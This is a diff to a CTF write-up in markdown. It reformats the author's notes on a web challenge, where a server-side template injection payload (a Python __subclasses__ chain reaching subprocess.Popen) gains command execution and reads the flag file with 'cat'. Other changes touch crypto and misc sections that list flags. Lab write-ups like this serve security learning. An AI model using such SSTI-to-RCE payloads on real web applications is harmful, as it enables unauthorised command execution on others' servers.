@@ -159,19 +159,19 @@
 
   ![image](https://github.com/user-attachments/assets/42725d11-9e19-4c1a-bb82-3220e3a0406c)
 
-- Uploading the tar file shows it works, here is the result of \{\{config\}\}, it should be noted that ssti payloads should be enclosed with \{\{\}\}
+- Uploading the tar file shows it works, here is the result of `config`, it should be noted that ssti payloads should be enclosed with \{\{\}\}
   
   ![image](https://github.com/user-attachments/assets/2aeca84b-8d71-4392-a868-e2f5382fef82)
 
 ### RCE
 
-- I got command execution with this payload \{\{"".__class__.__base__.__subclasses__()[351]\}\}, now we can execute shell commands with `class subprocess.Popen`.
+- I got command execution with this payload `"".__class__.__base__.__subclasses__()[351]`, now we can execute shell commands with `class subprocess.Popen`.
 
    ![image](https://github.com/user-attachments/assets/889412d1-1e9f-41f9-9f3f-07763f68100f)
 
 ### Reading the flag
 
-- I read the flag with this payload \{\{"".__class__.__base__.__subclasses__()[351]("cat flag_15b726a24e04cc6413cb15b9d91e548948dac073b85c33f82495b10e9efe2c6e.txt",shell=True,stdout=-1).communicate()\}\}
+- I read the flag with this payload `"".__class__.__base__.__subclasses__()[351]("cat flag_15b726a24e04cc6413cb15b9d91e548948dac073b85c33f82495b10e9efe2c6e.txt",shell=True,stdout=-1).communicate()`
 
   ![image](https://github.com/user-attachments/assets/68a287da-fea8-4b00-bd10-3053431c05f1)
 
@@ -218,7 +218,6 @@
 
         ❯ ./rsa.py
       n00bz{crypt0_1s_1nc0mpl3t3_w1th0ut_rs4!!}
-
   
 
 ### Rev:
@@ -337,6 +336,7 @@
 
       n00bz{beebbopmorsecode}
 
+
 * * *
 ### REFERENCES:
 
@@ -344,7 +344,7 @@
 
 - **Largest Prime Factor's script**: <a href="https://www.geeksforgeeks.org/find-largest-prime-factor-number/">GeekforGeeks</a>
 - **Wav file's magic bytes**: <a href="https://medium.com/@arifwc/writeup-bsides-delhi-ctf-2020-never-gonna-give-you-the-flag-forensics-616f547f2492">Aricfwc</a>
--
+
 
 
   
